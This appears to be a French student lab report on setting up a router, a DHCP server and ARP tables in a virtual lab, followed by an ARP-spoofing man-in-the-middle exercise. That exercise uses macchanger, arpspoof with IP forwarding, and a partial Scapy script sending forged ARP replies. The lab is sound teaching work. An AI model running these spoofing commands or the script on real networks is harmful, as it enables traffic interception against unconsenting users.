### TP2 ARP

## Configuration de router.tp2.efrei

On met une IP statique sur la carte LAN.

On a IP dynamique (DHCP) sur la carte WAN.

## Puis on Ping 1.1.1.1 pour prouver la connexion Internet

```bash
[root@localhost network-scripts]# ping 1.1.1.1

PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.

64 bytes from 1.1.1.1: icmp_seq=1 ttl=59 time=94.5 ms
64 bytes from 1.1.1.1: icmp_seq=2 ttl=59 time=25.0 ms
64 bytes from 1.1.1.1: icmp_seq=3 ttl=59 time=25.5 ms
64 bytes from 1.1.1.1: icmp_seq=4 ttl=59 time=25.1 ms

--- 1.1.1.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 25.047/42.533/94.500/30.003 ms
```

## Configuration des interfaces réseau

```bash
[root@localhost network-scripts]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:20:e4:7f brd ff:ff:ff:ff:ff:ff
    inet 10.0.3.16/24 brd 10.0.3.255 scope global dynamic noprefixroute enp0s3
       valid_lft 86311sec preferred_lft 86311sec
    inet6 fe80::a00:27ff:fe20:e47f/64 scope link
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:91:58:0b brd ff:ff:ff:ff:ff:ff
    inet 10.2.1.254/24 brd 10.2.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe91:580b/64 scope link
       valid_lft forever preferred_lft forever
```

## Configuration du routage

On configure Rocky Linux pour qu'il agisse comme un routeur :

```bash
firewall-cmd --add-masquerade
firewall-cmd --add-masquerade --permanent
```

## Configuration de node1.tp2.efrei

### Configuration IP

```bash
ip 10.2.1.1 10.2.1.254
save
```

### Test de connectivité

```bash
node1.tp2> ping 10.2.1.254
84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=3.761 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=4.244 ms
84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=9.235 ms
84 bytes from 10.2.1.254 icmp_seq=4 ttl=64 time=3.816 ms

node1.tp2> ping 8.8.8.8
84 bytes from 8.8.8.8 icmp_seq=1 ttl=115 time=31.357 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=115 time=27.082 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=115 time=32.532 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=115 time=30.258 ms
```

### Traceroute

```bash
node1.tp2> trace 10.2.1.254
trace to 10.2.1.254, 8 hops max, press Ctrl+C to stop
 1   *10.2.1.254   8.181 ms (ICMP type:3, code:13, Communication administratively prohibited)
```

## CAM Table

```bash
IOU1#show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et0/3
   1    0800.2791.580b    DYNAMIC     Et0/0
Total Mac Addresses for this criterion: 2
IOU1#
```

## Configuration DHCP

### Configurer une IP statique avec une gateway

```bash
DEVICE=enp0s3
NAME=ok

ONBOOT=yes
BOOTPROTO=static

IPADDR=10.2.1.253
NETMASK=255.255.255.0
GATEWAY=10.2.254

nmcli connection reload
nmcli connection up ok
```

### Installation du serveur DHCP

```bash
sudo dnf -y install dhcp-server
```

### Configuration du fichier DHCP

```bash
sudo nano /etc/dhcp/dhcpd.conf
```

Contenu :

```bash
authoritative;
subnet 10.2.1.0 netmask 255.255.255.0 {
    range 10.2.1.1 10.2.1.252;
    option broadcast-address 10.2.1.255;
    option routers 10.2.1.254;
    option domain-name-servers 8.8.8.8, 8.8.4.4, 1.1.1.1;
}
```

### Activation du service DHCP

```bash
systemctl enable --now dhcpd
```

### Test DHCP

```bash
testdhcp> dhcp
DDORA IP 10.2.1.2/24 GW 10.2.1.254

testdhcp> ping 8.8.8.8
84 bytes from 8.8.8.8 icmp_seq=1 ttl=114 time=36.362 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=114 time=29.835 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=114 time=33.018 ms
```

## ARP Legit

### Table ARP de node1

```bash
node1.tp2> show arp
08:00:27:89:2d:b8  10.2.1.253 expires in 93 seconds
```

### Table ARP du serveur DHCP

```bash
[root@localhost ~]# ip n s
10.2.1.2 dev enp0s3 lladdr 00:50:79:66:68:01 STALE
10.2.1.254 dev enp0s3 lladdr 08:00:27:91:58:0b REACHABLE
10.2.1.3 dev enp0s3 lladdr 00:50:79:66:68:00 STALE
```

## ARP Spoof

### Modifier l'adresse MAC avec macchanger

```bash
sudo macchanger -m 22:22:22:22:22:22 eth0
sudo ip link set eth0 up
```

### Vérifier l'adresse MAC

```bash
ip link show eth0
```

### Test avec arping

```bash
sudo arping -c 2 -I eth0 10.2.1.3
```

### Vérification sur node1

```bash
node1.tp2> show arp
22:22:22:22:22:22  10.2.1.5 expires in 77 seconds
```

### Configurer l'IP forwarding

```bash
sudo nano /etc/sysctl.d/99-ipforward.conf
```

Ajouter :

```bash
net.ipv4.ip_forward=1
```

Appliquer la configuration :

```bash
sudo sysctl --system
```

### Lancer ARP Spoofing

```bash
sudo arpspoof -i eth0 -t 10.2.1.3 10.2.1.254 & sudo arpspoof -i eth0 -t 10.2.1.254 10.2.1.3
```

### Résultat sur node1

```bash
node1.tp2> show arp
08:00:27:80:ad:91  10.2.1.4 expires in 93 seconds
08:00:27:80:ad:91  10.2.1.254 expires in 120 seconds
```

### Test de connectivité

```bash
ping 1.1.1.1
```

## Capture Wireshark

Utilisez Wireshark pour capturer les paquets et sauvegardez la capture sous `arp_mitm.pcap`. Appliquez un filtre pour ARP et ICMP :

```plaintext
icmp || arp


``````


# Scapy 

# Script Python Simplifié : ARP Spoofing


---

## **Script Python**

```python
from scapy.all import ARP, send
import time


target_ip = "10.2.1.3"      
gateway_ip = "10.2.1.254"    


def arp_spoof():
    print(f"[+] Lancement de l'ARP spoofing : {target_ip} ↔ {gateway_ip}")
    try:
        while True:
            
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip), verbose=False)
           
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip), verbose=False)
            time.sleep(1) 
